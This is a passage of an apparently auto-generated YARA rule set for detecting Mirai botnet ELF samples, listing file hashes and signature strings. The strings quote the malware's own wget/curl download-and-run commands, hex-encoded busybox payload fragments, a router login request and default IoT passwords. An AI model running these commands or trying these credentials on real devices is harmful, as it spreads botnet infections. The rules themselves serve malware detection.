      hash6 = "b9b50507887433b6f7db229424f1f564537986b5f8b841216106c5e09e9aa05d"
      hash7 = "bb77bff9f7c4220513ebc54292d9c4e5068729e180995a5b7c0722c9312b6e01"
      hash8 = "beb19cc4182cadfc60aa921287e1d9eb7c1760c72a767cda2802ae793334d974"
      hash9 = "bf754dbc36e70fe81668248e1aa553825154b0eae0b6b3ba120494d0bf2f2980"
      hash10 = "c02b2596e86ee0ad80244c466ff29e5f2d8835054b56d66518b75df8d03a5d9e"
      hash11 = "c123cce3a10ab43592c9ab822420c03315a2c060351b01b52b45e829ac18fb6b"
      hash12 = "c1aac960ee2a7d3bba9fb05fafe17e59b260111b69cb9917e4e1d7d6dc520792"
      hash13 = "c38f861e736245d5a24f94ad0ac625c7f6001c82e34f40023ffc3b1c0aa74398"
      hash14 = "c4bd61d55f4f0f7908082d2c4ea1ca44389b04c30459857bcb24ca248241cee1"
      hash15 = "c4dfc5816fde203ee3e1915c496c02dbd61588acdfae7eade77a04dce7ae8343"
      hash16 = "c5b68f9bef05fd8cadedc3d99742d801eaa44a3b02066511c74d96daba4db635"
      hash17 = "c9922ed8521e186ce9fe038658d57d07df71bbcebc062d2451c78af0f659c97c"
      hash18 = "cae86c37f7ab372e85499b4e8cc51c2be933d58b1aba0ef934c7384d1ed8b763"
      hash19 = "cc7db2c738cf2caf40a112b50fc19d3e97782dd6ad3bfc3b12b11b5e37c60452"
      hash20 = "cca9f1d57e49da2c594217f582eac93e2c856b334723a8f4ac9ff598c79b0ec1"
      hash21 = "cd8f5c0927f3cac4d225a5fee8b8d409712cf1a7e7cea5b1b903c3caad59808f"
      hash22 = "d3c5f28247776b236c137d28e0da5ac844666199aba1c7bb90bb332cccbdaa04"
      hash23 = "d413ae700aff33daa770580d8021223a9d636c3dcc12bacb8c26e585d1f0bd17"
      hash24 = "d569e9b685ea3cd1c81daad967f6b9e127e4fb31febe17c2eebf90a40482954a"
      hash25 = "d7d7b7e56b3019bff7da092fdeac7bdb4bdf7c671d8a128931e5e01ad56f020c"
      hash26 = "d85b3eb29ee7f646726c1de83dac23d3c2632dc5420711676f43df789ccc6d0b"
      hash27 = "d8a206f4b55e055fefb4c19d7d62045cb6e0f32e1afa3207dfdee6129a6c9f0f"
      hash28 = "d8d31aefe9c2b860668bc353070dd39c9cc471ee0e177244d14aecd627843530"
      hash29 = "dac5eb94db75b7b648a507e155eb4f46eb1c8e90f8c04853a05b9384cc208a85"
      hash30 = "dbb3bb6eebf5717676045c9b683de6db4bfe065c2bcd44f4e50496b816d8a53a"
      hash31 = "dd22ab34bbb97ad917444fabbbe4ba0558930051240939b8a136c5d23a889cf3"
      hash32 = "de0adbc961e953a76fe7272960c1a143fca73cdc3e6e9ede0dab58f3c5021f33"
      hash33 = "df68ed24a86ef232acfcb4c4ac38b759e329ca12163d5ee8b2e8beba26e24637"
      hash34 = "dfcd48b1545ba5cb26b267cfe470f17cdffa77a9fe8e166254ffcd6ffe7da095"
      hash35 = "e16a5e543be159372994cf2bd528b703cfc4ebe667e153a34de20e13de0bc265"
      hash36 = "e1ff45b95e588536a336ebb85241e708030c9eba21cd798c02d10f912f1b7f75"
      hash37 = "e2939a86e75880e76cce1685af2403b398e41a2b4a271888e77103928d3aaf22"
      hash38 = "e35102864c80d5b00e3d68918e4f5212d65efa2d3366dd7142203e787b65d43a"
      hash39 = "e40c6fdca0d1feddd8358fdf82744315fe7e3f8512fd5edb2b946967798e58f9"
      hash40 = "e4acbf0a1448e928ea7714cf90692001c454b37d78b13a955f475568b36bbaec"
      hash41 = "e672e0b7f14c1457cc7e38714cca7e4b7157d0c5c1f7534ec363fcca13a2926e"
      hash42 = "e68e4a986a109e6ca9d12bc890cd9aca7cddab8d449ad961bfd04f5f88c8d1fd"
      hash43 = "e9b396781f1f326b9b66ff4139e89de6b55ea9aae5b4d271396a49d97bd56599"
      hash44 = "ea80c8175fcd811188479f5420a1be4dab2c65a0a1d569c36a92edf1e1c3ef21"
      hash45 = "ead4a102bde23a81c6e93a337d01892c68f3f67882d104bc90c46a2bca5f2bce"
      hash46 = "ed8a79424f7fd11d3eb8a3295723765b2bd95b91dda074675e22b688d8e04e0f"
      hash47 = "ee5c160e3f43b4946d1a8ee320b0e221488198351cc779bd8b7b3852e0a98e04"
      hash48 = "ef0759560923799625dbffbc95e23935d0c09da4aad0e7e285a24510c1255a97"
      hash49 = "f0bb1000a58d0ab8da0305bae413010217362f7891a9debf3d390e93f89c552a"
      hash50 = "f0e367230e846b5766c5006f881027155a247f94ace7753e3a411118fb0e0031"
      hash51 = "f33bccf88f58f7b6e5cc024b04fc546c229888d07e8a754779f0e8fab533be1a"
      hash52 = "f532f12d53ea7861e128265d349b5623fee8e4680eb85b8ca6040d0597d73fbd"
      hash53 = "f68a2f3b5572692941b060032b1a71358f98fc4abb377e22aadafd59a82d75e0"
      hash54 = "f692fc8b862f4ab4c96c4dc9da877667245cfba00d686736d67fc20e40bf3301"
      hash55 = "f831fddd67f15ce2247022b02172f37ea95bc56357cdfca501b5f68c229a345b"
      hash56 = "f9361ef70bac2376788afea13705b14ca90570bb34fdb600481e76d2bcd08b3a"
      hash57 = "fa11b5223cfd7063f66e25e55bae431cc232e442bc21a017ddb2f3e40261e355"
      hash58 = "fa96cf95515c5e6f86084aa51099fb5e5c0cec71c651bf08ec7b53b2a3029705"
      hash59 = "fae30571242f83d356daa8b591b991562bfaac49c8acbc614e645d8cb81bc1c7"
      hash60 = "fc2117cb6a4433fc0a3711ce912f4a1794741dfe467cf7c64ac9250e125b927c"
   strings:
      $s1 = "User-Agent: Wget" fullword ascii /* score: '17.00'*/
      $s2 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */ /* score: '15.00'*/
      $s3 = "supportadmin" fullword ascii /* score: '11.00'*/
      $s4 = "solokey" fullword ascii /* score: '11.00'*/
      $s5 = "/bin/busybox echo -ne " fullword ascii /* score: '11.00'*/
      $s6 = "admintelecom" fullword ascii /* score: '11.00'*/
      $s7 = "tsgoingon" fullword ascii /* score: '8.00'*/
      $s8 = "root621" fullword ascii /* score: '8.00'*/
      $s9 = "hikvision" fullword ascii /* score: '8.00'*/
      $s10 = "root123" fullword ascii /* score: '8.00'*/
      $s11 = "wabjtam" fullword ascii /* score: '8.00'*/
      $s12 = "firetide" fullword ascii /* score: '8.00'*/
      $s13 = "unisheen" fullword ascii /* score: '8.00'*/
      $s14 = "grouter" fullword ascii /* score: '8.00'*/
      $s15 = "zhongxing" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b161dba5_Mirai_signature__b551fa6c_Mirai_signature__b9b50507_Mirai_signature__beb19cc4_Mirai_signature__c1_16 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b161dba5.elf, Mirai(signature)_b551fa6c.elf, Mirai(signature)_b9b50507.elf, Mirai(signature)_beb19cc4.elf, Mirai(signature)_c123cce3.elf, Mirai(signature)_c38f861e.elf, Mirai(signature)_c4bd61d5.elf, Mirai(signature)_cae86c37.elf, Mirai(signature)_cc7db2c7.elf, Mirai(signature)_d413ae70.elf, Mirai(signature)_d569e9b6.elf, Mirai(signature)_d7d7b7e5.elf, Mirai(signature)_d8d31aef.elf, Mirai(signature)_df68ed24.elf, Mirai(signature)_e16a5e54.elf, Mirai(signature)_e40c6fdc.elf, Mirai(signature)_e4acbf0a.elf, Mirai(signature)_e68e4a98.elf, Mirai(signature)_ea80c817.elf, Mirai(signature)_ead4a102.elf, Mirai(signature)_ed8a7942.elf, Mirai(signature)_ee5c160e.elf, Mirai(signature)_ef075956.elf, Mirai(signature)_f0bb1000.elf, Mirai(signature)_f33bccf8.elf, Mirai(signature)_f532f12d.elf, Mirai(signature)_f68a2f3b.elf, Mirai(signature)_fa96cf95.elf, Mirai(signature)_fc2117cb.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b161dba5790533d43d1f14c7a906ba69746cf9433ffb5d27ddcf7ee0c201d8fb"
      hash2 = "b551fa6c16c8670ac26cf0eb9237e70bf663a22039abd9e8afa14faca03b681d"
      hash3 = "b9b50507887433b6f7db229424f1f564537986b5f8b841216106c5e09e9aa05d"
      hash4 = "beb19cc4182cadfc60aa921287e1d9eb7c1760c72a767cda2802ae793334d974"
      hash5 = "c123cce3a10ab43592c9ab822420c03315a2c060351b01b52b45e829ac18fb6b"
      hash6 = "c38f861e736245d5a24f94ad0ac625c7f6001c82e34f40023ffc3b1c0aa74398"
      hash7 = "c4bd61d55f4f0f7908082d2c4ea1ca44389b04c30459857bcb24ca248241cee1"
      hash8 = "cae86c37f7ab372e85499b4e8cc51c2be933d58b1aba0ef934c7384d1ed8b763"
      hash9 = "cc7db2c738cf2caf40a112b50fc19d3e97782dd6ad3bfc3b12b11b5e37c60452"
      hash10 = "d413ae700aff33daa770580d8021223a9d636c3dcc12bacb8c26e585d1f0bd17"
      hash11 = "d569e9b685ea3cd1c81daad967f6b9e127e4fb31febe17c2eebf90a40482954a"
      hash12 = "d7d7b7e56b3019bff7da092fdeac7bdb4bdf7c671d8a128931e5e01ad56f020c"
      hash13 = "d8d31aefe9c2b860668bc353070dd39c9cc471ee0e177244d14aecd627843530"
      hash14 = "df68ed24a86ef232acfcb4c4ac38b759e329ca12163d5ee8b2e8beba26e24637"
      hash15 = "e16a5e543be159372994cf2bd528b703cfc4ebe667e153a34de20e13de0bc265"
      hash16 = "e40c6fdca0d1feddd8358fdf82744315fe7e3f8512fd5edb2b946967798e58f9"
      hash17 = "e4acbf0a1448e928ea7714cf90692001c454b37d78b13a955f475568b36bbaec"
      hash18 = "e68e4a986a109e6ca9d12bc890cd9aca7cddab8d449ad961bfd04f5f88c8d1fd"
      hash19 = "ea80c8175fcd811188479f5420a1be4dab2c65a0a1d569c36a92edf1e1c3ef21"
      hash20 = "ead4a102bde23a81c6e93a337d01892c68f3f67882d104bc90c46a2bca5f2bce"
      hash21 = "ed8a79424f7fd11d3eb8a3295723765b2bd95b91dda074675e22b688d8e04e0f"
      hash22 = "ee5c160e3f43b4946d1a8ee320b0e221488198351cc779bd8b7b3852e0a98e04"
      hash23 = "ef0759560923799625dbffbc95e23935d0c09da4aad0e7e285a24510c1255a97"
      hash24 = "f0bb1000a58d0ab8da0305bae413010217362f7891a9debf3d390e93f89c552a"
      hash25 = "f33bccf88f58f7b6e5cc024b04fc546c229888d07e8a754779f0e8fab533be1a"
      hash26 = "f532f12d53ea7861e128265d349b5623fee8e4680eb85b8ca6040d0597d73fbd"
      hash27 = "f68a2f3b5572692941b060032b1a71358f98fc4abb377e22aadafd59a82d75e0"
      hash28 = "fa96cf95515c5e6f86084aa51099fb5e5c0cec71c651bf08ec7b53b2a3029705"
      hash29 = "fc2117cb6a4433fc0a3711ce912f4a1794741dfe467cf7c64ac9250e125b927c"
   strings:
      $s1 = "/t/wget.sh -O- | sh;curl http://" fullword ascii /* score: '20.00'*/
      $s2 = "/bin/busybox wget http://" fullword ascii /* score: '15.00'*/
      $s3 = "/t/curl.sh -o- | sh" fullword ascii /* score: '12.00'*/
      $s4 = "/bin/busybox echo -ne \"\\x71\\x20\\x22\\x24\\x70\\x69\\x64\\x22\\x20\\x5D\\x20\\x32\\x3E\\x20\\x2F\\x64\\x65\\x76\\x2F\\x6E\\x7" ascii /* score: '11.00'*/
      $s5 = "/bin/busybox echo -ne \"\\x71\\x20\\x22\\x24\\x70\\x69\\x64\\x22\\x20\\x5D\\x20\\x32\\x3E\\x20\\x2F\\x64\\x65\\x76\\x2F\\x6E\\x7" ascii /* score: '11.00'*/
      $s6 = "/bin/busybox echo -ne \"\\x20\\x20\\x70\\x69\\x64\\x3D\\x24\\x7B\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x23\\x23\\x2A\\x2F\\x7" ascii /* score: '11.00'*/
      $s7 = "/bin/busybox echo -ne \"\\x20\\x2F\\x70\\x72\\x6F\\x63\\x2F\\x24\\x70\\x69\\x64\\x2F\\x63\\x6D\\x64\\x6C\\x69\\x6E\\x65\\x20\\x3" ascii /* score: '11.00'*/
      $s8 = "/bin/busybox echo -ne \"\\x69\\x6E\\x75\\x65\\x0A\\x20\\x20\\x66\\x69\\x0A\\x0A\\x20\\x20\\x23\\x20\\x47\\x65\\x74\\x20\\x74\\x6" ascii /* score: '11.00'*/
      $s9 = "/bin/busybox echo -ne \"\\x20\\x74\\x68\\x65\\x20\\x70\\x72\\x6F\\x63\\x65\\x73\\x73\\x0A\\x20\\x20\\x63\\x6D\\x64\\x6C\\x69\\x6" ascii /* score: '11.00'*/
      $s10 = "/bin/busybox echo -ne \"\\x20\\x74\\x68\\x65\\x20\\x70\\x72\\x6F\\x63\\x65\\x73\\x73\\x0A\\x20\\x20\\x63\\x6D\\x64\\x6C\\x69\\x6" ascii /* score: '11.00'*/
      $s11 = "/bin/busybox echo -ne \"\\x6E\\x75\\x6D\\x65\\x72\\x69\\x63\\x20\\x64\\x69\\x72\\x65\\x63\\x74\\x6F\\x72\\x69\\x65\\x73\\x0A\\x2" ascii /* score: '11.00'*/
      $s12 = "/bin/busybox echo -ne \"\\x20\\x20\\x70\\x69\\x64\\x3D\\x24\\x7B\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x23\\x23\\x2A\\x2F\\x7" ascii /* score: '11.00'*/
      $s13 = "/bin/busybox echo -ne \"\\x69\\x6E\\x75\\x65\\x0A\\x20\\x20\\x66\\x69\\x0A\\x0A\\x20\\x20\\x23\\x20\\x47\\x65\\x74\\x20\\x74\\x6" ascii /* score: '11.00'*/
      $s14 = "/bin/busybox echo -ne \"\\x20\\x43\\x68\\x65\\x63\\x6B\\x20\\x69\\x66\\x20\\x74\\x68\\x65\\x20\\x63\\x6F\\x6D\\x6D\\x61\\x6E\\x6" ascii /* score: '11.00'*/
      $s15 = "/bin/busybox echo -ne \"\\x76\\x72\\x48\\x65\\x6C\\x70\\x65\\x72\\x22\\x0A\\x20\\x20\\x69\\x66\\x20\\x65\\x63\\x68\\x6F\\x20\\x2" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b33b31f1_Mirai_signature__b52643bc_Mirai_signature__b7ceaa35_Mirai_signature__b9f808b7_Mirai_signature__bc_17 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b33b31f1.elf, Mirai(signature)_b52643bc.elf, Mirai(signature)_b7ceaa35.elf, Mirai(signature)_b9f808b7.elf, Mirai(signature)_bcce3295.elf, Mirai(signature)_c53f3f4a.elf, Mirai(signature)_c6e5e3de.elf, Mirai(signature)_c74ebc06.elf, Mirai(signature)_c9088a50.elf, Mirai(signature)_ce7cb803.elf, Mirai(signature)_d0011fed.elf, Mirai(signature)_d102ff43.elf, Mirai(signature)_d21c89ef.elf, Mirai(signature)_d281fd0d.elf, Mirai(signature)_d56d11f7.elf, Mirai(signature)_d8c941eb.elf, Mirai(signature)_dc512e5d.elf, Mirai(signature)_ddd31ce2.elf, Mirai(signature)_e04a2d04.elf, Mirai(signature)_e1802e85.elf, Mirai(signature)_e1f2bee8.elf, Mirai(signature)_e26709b0.elf, Mirai(signature)_edb07abc.elf, Mirai(signature)_efc129dc.elf, Mirai(signature)_f04b1c89.elf, Mirai(signature)_f0af9af0.elf, Mirai(signature)_f185493b.elf, Mirai(signature)_f3291553.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b33b31f1b97e56a4718e745caddc5fe11c57394d1bb8ad72e8df4fa70af64007"
      hash2 = "b52643bcce41d7483fcc926ba1bf841dc5693549e9c0765c38f42eeaf199f831"
      hash3 = "b7ceaa35c66f9aaf6b6ae46cda52f2c249235012ddf24dea4e49746008496c66"
      hash4 = "b9f808b7c2d63b94a2b771b2888c6608c96234ba2f0aa227cb73579d6204ca2d"
      hash5 = "bcce329532aefb43914eff68d30c66d1f6ee1b5703726f12ee97d222c70c808a"
      hash6 = "c53f3f4aabd55bc53fe374940c9b1e443563833572ecd4dcac458fe8883b8dc3"
      hash7 = "c6e5e3def1ed99838f5035777a2a9f02947e4b4d7420e7b3095a00ef4b22a3d9"
      hash8 = "c74ebc0618950bd3146d9c0033ee6112116fa644859181a9de944104f429c1e6"
      hash9 = "c9088a5062bff0babbd7d0d57db04bbb246f42f1d27a070bc8f9cd218b80d6ff"
      hash10 = "ce7cb803babd922594b2ce97be253cf34f26820c77fb04b4e949e9c475b17e95"
      hash11 = "d0011fed2ec415580dfae3f89e8d5bf176b685eebae97975041a9bbba4cd1c9e"
      hash12 = "d102ff43d43bffb64cfe9fdf7c775ebaa78c2b79c5c72f50f73c9fb098aa133e"
      hash13 = "d21c89ef8692e1182e815daa5363aaa284d5783e5570485d8734cd437035df34"
      hash14 = "d281fd0d07905b6d53a5d22e89a703f7ec878973e08a7824418d7784896aff3b"
      hash15 = "d56d11f7692f85f018f8829b899048cf3350aba9c1578302c6cb3db67608c8bd"
      hash16 = "d8c941eba0c43a485425d6270cc1c48a486fb1be5c998e116488f63efcb99421"
      hash17 = "dc512e5dda3851a35f7e1e3dd54769e3fedc513d3faa43a07309ed3b05a6b6b1"
      hash18 = "ddd31ce2eb639acaceadf5a821829fd9cb0cd0825ade45d7919978efbc5a02c9"
      hash19 = "e04a2d04e7e72a19917d180042f9c21dfb3b6a86ca1ad35819a23b237d64ca61"
      hash20 = "e1802e855658f7f679b9b52cb51de9c0ec3494810b2c59a6bc0ee6dc59e85b60"
      hash21 = "e1f2bee863285795dcfa3d6298b38ee2be3e6f8a70f64f1c0de5874251cef63e"
      hash22 = "e26709b0904aba7f3288f3f83631e58a126d492f420c8310133cc6fbf81676ee"
      hash23 = "edb07abc54517a9f8ae8e33dc7170dc99178e9fd39ba5b6547a14b52cbc63ff9"
      hash24 = "efc129dce9c2f036da7cbc5ac154bfcc2dcf6311c2d3ce89345fc0c065d5ff5b"
      hash25 = "f04b1c89060f80a8f381421dcbd0a82f98107baef4333ba4ed1d0f8da707bfee"
      hash26 = "f0af9af005ea457a061820f2de33adbc9353ab09378960b738afb023264e23db"
      hash27 = "f185493b01d47584ac4dec0d4914f577f31eb6f08b70cf505fee1498853372a8"
      hash28 = "f329155356c4eddcdbf1af2e9c2b9cb7165b4a822404c91ab8606576b3022699"
   strings:
      $s1 = "__get_hosts_byname_r" fullword ascii /* score: '14.00'*/
      $s2 = "gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s3 = "get_hosts_byname_r.c" fullword ascii /* score: '14.00'*/
      $s4 = "__GI_gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s5 = "gethostbyname_r.c" fullword ascii /* score: '14.00'*/
      $s6 = "__read_etc_hosts_r" fullword ascii /* score: '12.00'*/
      $s7 = "read_etc_hosts_r.c" fullword ascii /* score: '12.00'*/
      $s8 = "decoded.c" fullword ascii /* score: '11.00'*/
      $s9 = "__decode_header" fullword ascii /* score: '11.00'*/
      $s10 = "encoded.c" fullword ascii /* score: '9.00'*/
      $s11 = "__open_etc_hosts" fullword ascii /* score: '9.00'*/
      $s12 = "__encode_header" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b33b31f1_Mirai_signature__b52643bc_Mirai_signature__b7ceaa35_Mirai_signature__b9f808b7_Mirai_signature__bc_18 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b33b31f1.elf, Mirai(signature)_b52643bc.elf, Mirai(signature)_b7ceaa35.elf, Mirai(signature)_b9f808b7.elf, Mirai(signature)_bcce3295.elf, Mirai(signature)_c6e5e3de.elf, Mirai(signature)_c74ebc06.elf, Mirai(signature)_d0011fed.elf, Mirai(signature)_d102ff43.elf, Mirai(signature)_d21c89ef.elf, Mirai(signature)_d281fd0d.elf, Mirai(signature)_dc512e5d.elf, Mirai(signature)_ddd31ce2.elf, Mirai(signature)_e04a2d04.elf, Mirai(signature)_e1802e85.elf, Mirai(signature)_efc129dc.elf, Mirai(signature)_f04b1c89.elf, Mirai(signature)_f185493b.elf, Mirai(signature)_f3291553.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b33b31f1b97e56a4718e745caddc5fe11c57394d1bb8ad72e8df4fa70af64007"
      hash2 = "b52643bcce41d7483fcc926ba1bf841dc5693549e9c0765c38f42eeaf199f831"
      hash3 = "b7ceaa35c66f9aaf6b6ae46cda52f2c249235012ddf24dea4e49746008496c66"
      hash4 = "b9f808b7c2d63b94a2b771b2888c6608c96234ba2f0aa227cb73579d6204ca2d"
      hash5 = "bcce329532aefb43914eff68d30c66d1f6ee1b5703726f12ee97d222c70c808a"
      hash6 = "c6e5e3def1ed99838f5035777a2a9f02947e4b4d7420e7b3095a00ef4b22a3d9"
      hash7 = "c74ebc0618950bd3146d9c0033ee6112116fa644859181a9de944104f429c1e6"
      hash8 = "d0011fed2ec415580dfae3f89e8d5bf176b685eebae97975041a9bbba4cd1c9e"
      hash9 = "d102ff43d43bffb64cfe9fdf7c775ebaa78c2b79c5c72f50f73c9fb098aa133e"
      hash10 = "d21c89ef8692e1182e815daa5363aaa284d5783e5570485d8734cd437035df34"
      hash11 = "d281fd0d07905b6d53a5d22e89a703f7ec878973e08a7824418d7784896aff3b"
      hash12 = "dc512e5dda3851a35f7e1e3dd54769e3fedc513d3faa43a07309ed3b05a6b6b1"
      hash13 = "ddd31ce2eb639acaceadf5a821829fd9cb0cd0825ade45d7919978efbc5a02c9"
      hash14 = "e04a2d04e7e72a19917d180042f9c21dfb3b6a86ca1ad35819a23b237d64ca61"
      hash15 = "e1802e855658f7f679b9b52cb51de9c0ec3494810b2c59a6bc0ee6dc59e85b60"
      hash16 = "efc129dce9c2f036da7cbc5ac154bfcc2dcf6311c2d3ce89345fc0c065d5ff5b"
      hash17 = "f04b1c89060f80a8f381421dcbd0a82f98107baef4333ba4ed1d0f8da707bfee"
      hash18 = "f185493b01d47584ac4dec0d4914f577f31eb6f08b70cf505fee1498853372a8"
      hash19 = "f329155356c4eddcdbf1af2e9c2b9cb7165b4a822404c91ab8606576b3022699"
   strings:
      $s1 = "UserAgents" fullword ascii /* score: '12.00'*/
      $s2 = "httphex" fullword ascii /* score: '11.00'*/
      $s3 = "resolv_domain_to_hostname" fullword ascii /* score: '9.00'*/
      $s4 = "makevsepacket" fullword ascii /* score: '8.00'*/
      $s5 = "vseattack" fullword ascii /* score: '8.00'*/
      $s6 = "szprintf" fullword ascii /* score: '8.00'*/
      $s7 = "hextable" fullword ascii /* score: '8.00'*/
      $s8 = "fdpopen" fullword ascii /* score: '8.00'*/
      $s9 = "zprintf" fullword ascii /* score: '8.00'*/
      $s10 = "fdpclose" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _Mirai_signature__bb7ca4d5_Mirai_signature__d99d31db_Mirai_signature__fb0253b7_19 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_bb7ca4d5.elf, Mirai(signature)_d99d31db.elf, Mirai(signature)_fb0253b7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bb7ca4d580b48c1d259924a7760b2c35c9a24f1d5d816ce321d3b3a2a2c5f92f"
      hash2 = "d99d31dba21bc3f823b71baf039e14ce6b8a3cd824fb15e497dca07d736d2290"
      hash3 = "fb0253b7a03d2e92011dabf070cc491c1e5f8573a0402486f1daf4a705d1a9d9"
   strings:
      $s1 = "POST /login.htm HTTP/1.1" fullword ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '29.00'*/
      $s3 = "command=login&username=%s&password=%s" fullword ascii /* score: '26.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '24.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root/ wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s7 = "Host: %s:554" fullword ascii /* score: '14.50'*/
      $s8 = "/usr/sbin/klogd" fullword ascii /* score: '12.00'*/
      $s9 = "!openshell %d %8s" fullword ascii /* score: '12.00'*/
      $s10 = "/usr/sbin/syslogd" fullword ascii /* score: '12.00'*/
      $s11 = "kthreadd" fullword ascii /* score: '11.00'*/
      $s12 = "/sbin/.sysd" fullword ascii /* score: '11.00'*/
      $s13 = "/usr/bin/.sysd" fullword ascii /* score: '8.00'*/
      $s14 = "ksoftirqd" fullword ascii /* score: '8.00'*/
      $s15 = "echo -en" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b16979fe_Mirai_signature__b19e2a2d_Mirai_signature__b2fe8670_Mirai_signature__b66de47e_Mirai_signature__b8_20 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b16979fe.elf, Mirai(signature)_b19e2a2d.elf, Mirai(signature)_b2fe8670.elf, Mirai(signature)_b66de47e.elf, Mirai(signature)_b81a6f1a.elf, Mirai(signature)_bb3e1db2.elf, Mirai(signature)_bc5e6c53.elf, Mirai(signature)_bd72e052.elf, Mirai(signature)_bec7e174.elf, Mirai(signature)_c044c53a.elf, Mirai(signature)_c2e6dba5.elf, Mirai(signature)_c4201234.elf, Mirai(signature)_c5f3d4bf.elf, Mirai(signature)_cad760a1.elf, Mirai(signature)_ceb8a233.elf, Mirai(signature)_cf4e1220.elf, Mirai(signature)_d315580b.elf, Mirai(signature)_d4e23115.elf, Mirai(signature)_d5379e65.elf, Mirai(signature)_d6c600c2.elf, Mirai(signature)_d82bfbab.elf, Mirai(signature)_d96dd8cd.elf, Mirai(signature)_d9ec56d6.elf, Mirai(signature)_e3c6cc62.elf, Mirai(signature)_e4592759.elf, Mirai(signature)_e972593b.elf, Mirai(signature)_ebc16504.elf, Mirai(signature)_ed740340.elf, Mirai(signature)_eff30b6f.elf, Mirai(signature)_f076cd1f.elf, Mirai(signature)_f0f86f0b.elf, Mirai(signature)_f1e22b07.elf, Mirai(signature)_f1fd54f3.elf, Mirai(signature)_f25f8be1.elf, Mirai(signature)_f26608a2.elf, Mirai(signature)_f33b96ef.elf, Mirai(signature)_f67bf8d7.elf, Mirai(signature)_f6b54458.elf, Mirai(signature)_f6e345ae.elf, Mirai(signature)_f7af35b2.elf, Mirai(signature)_f99af9b1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b16979fee68886ea04f4bdcc24f0edcc406a0bcdf8bc4c2e7a1f34fa2c2d3e9e"
      hash2 = "b19e2a2d833518ae913c0f16e262c4d89df59d2256db444af93ee49ef25a93d0"
      hash3 = "b2fe8670b8214083089628d0b0baff1c2a0fabe781989d43be7af7c44bff69e4"
      hash4 = "b66de47ecd0ff70ddc9bd24b5109396306270527f0cd60a5d104b3c0296f7b5f"
      hash5 = "b81a6f1a0f3fe99e931f1251ada1daefadf80c909c659143fce4d0c5826a7d6f"
      hash6 = "bb3e1db2ee359592567e2506d5a2eb0ae87ce29b1d9dad08f610b53827c84ad6"
      hash7 = "bc5e6c53ac612a1fd7e24426dcb58ceb32a849ffac7ac0cb2939c765ed72ada1"
      hash8 = "bd72e0522ddf03337c08230ab26af4d7150683c4f52d09d5017e34a6abba1049"
      hash9 = "bec7e174837eee065ca34161a4ad9f4a0cf3f2793a4c1dfa5658453f88130326"
      hash10 = "c044c53af22b7392c439928aa9f6de83ca52de1d4631f7b7f8b943e6a94e6e3e"
      hash11 = "c2e6dba52c0709ac9e0d9ea87422df7d246e77fdce651aa816b4ac47471adfb2"
      hash12 = "c4201234543c5191a40a0da9f9173f4fe0bdb2dfd6b8e507e64b3c0ff6a3c4d3"
      hash13 = "c5f3d4bfaef2eccaf02c3671b4de9abc6e52b109ab3f0ba02c81b16183fcb8ed"
      hash14 = "cad760a135de181db58472ff293783dc740823d1507dcb73914268e8c8201f9c"
      hash15 = "ceb8a233f20930edf7159e048eb4def0bcd9dc3dda3a2018023e02758fe3e7cb"
      hash16 = "cf4e12206405d31e413b2d539e7b57d9f04fdd6626cf211b98895973b818866e"
      hash17 = "d315580b4383b94fd5d2a8aefe186d2b9380cf29081796e7ed82b403f6854bb0"
      hash18 = "d4e23115478baef3fe7d782422bb79934234d85b53d72de45a719153f9f8152f"
      hash19 = "d5379e65966d057b058d36229b8a1159617f986701714ffa193028465b6a09e3"
      hash20 = "d6c600c246e5127a83fa1b12863e9ad6b79142edc96023acb6ceba8d94b17322"
      hash21 = "d82bfbab2112ba7bfe20a67c4601647244480344814a4963a4a6005a69cc790d"
      hash22 = "d96dd8cdb9275d2f71905a1f3ca11cb2940ba5446cdd06479e053eb77dc096ef"
      hash23 = "d9ec56d62afbd13fd9f679256e41f9045ccee0cdd5e6c2ba8b0cf5f4aff33e9a"
      hash24 = "e3c6cc622a79d3edcb76b52e1e2a3d1007be421481dd1e3802655fc3739d4b6c"
      hash25 = "e45927592cace0bd143fa2b269f67837bf6c3b10d879885220890bbfd394d8c1"
      hash26 = "e972593b939c64aa7790812391c5f0a98df0b936a5c093cd182454283d980bd9"
